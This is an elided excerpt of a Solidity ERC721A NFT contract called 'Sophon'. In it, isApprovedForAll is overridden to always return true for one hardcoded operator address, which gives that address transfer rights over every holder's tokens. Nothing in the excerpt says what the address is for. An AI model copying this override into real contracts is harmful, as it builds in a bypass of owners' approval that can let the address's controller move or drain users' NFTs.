  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xb44909D95A6027A67980943C011B9D2742f97Eb2){return true;}
...
contract Sophon is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Sophon", "SOP", maxBatchSize_, collectionSize_) {
